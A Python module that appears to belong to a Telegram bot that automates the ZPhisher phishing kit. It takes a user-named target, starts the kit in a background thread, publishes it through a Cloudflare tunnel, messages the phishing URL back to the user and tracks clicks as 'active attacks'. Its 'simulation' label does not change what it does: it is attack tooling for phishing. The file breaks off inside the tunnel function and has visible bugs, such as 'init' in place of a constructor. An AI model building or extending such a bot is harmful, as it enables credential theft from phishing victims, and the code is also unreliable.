import subprocess
import threading
import time
import requests
import logging
from telegram import Update
from telegram.ext import ContextTypes
import json
import os
from const import USER_DATA_FILE, ZPHISHER_PATH, CLOUDFLARE_TUNNEL_TIMEOUT

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class ZPhisherManager:
    def init(self):
        self.active_attacks = {}
        
    def start_zphisher_attack(self, user_id: int, target: str, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Start ZPhisher in background and create Cloudflare tunnel"""
        try:
            # Save user input
            self._save_user_input(user_id, target)
            
            # Start ZPhisher in background
            zphisher_thread = threading.Thread(
                target=self._run_zphisher,
                args=(user_id, target, update, context)
            )
            zphisher_thread.daemon = True
            zphisher_thread.start()
            
        except Exception as e:
            logger.error(f"Error starting ZPhisher: {e}")
            context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ Error starting phishing simulation. Please try again later."
            )
    
    def _run_zphisher(self, user_id: int, target: str, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Run ZPhisher and create tunnel"""
        try:
            # Start Cloudflare tunnel first
            tunnel_url = self._start_cloudflare_tunnel(user_id)
            if not tunnel_url:
                raise Exception("Failed to create Cloudflare tunnel")
            
            # Send URL to user
            context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"🔗 Phishing URL created:\n{tunnel_url}\n\nTarget: {target}"
            )
            
            # Save URL in user data
            self._save_phishing_url(user_id, tunnel_url, target)
            
            # Monitor for clicks (simulated - in real scenario you'd monitor your server logs)
            self._monitor_clicks(user_id, tunnel_url, target, context)
            
        except Exception as e:
            logger.error(f"Error in ZPhisher execution: {e}")
            context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ Error in phishing simulation setup."
            )
    
    def _start_cloudflare_tunnel(self, user_id: int) -> str:
        """Start Cloudflare tunnel and return URL"""
        try:
            # Note: This is a simplified implementation
            # In production, you'd use the cloudflared command or API
            # For demonstration, we'll simulate a tunnel URL
            # Simulate
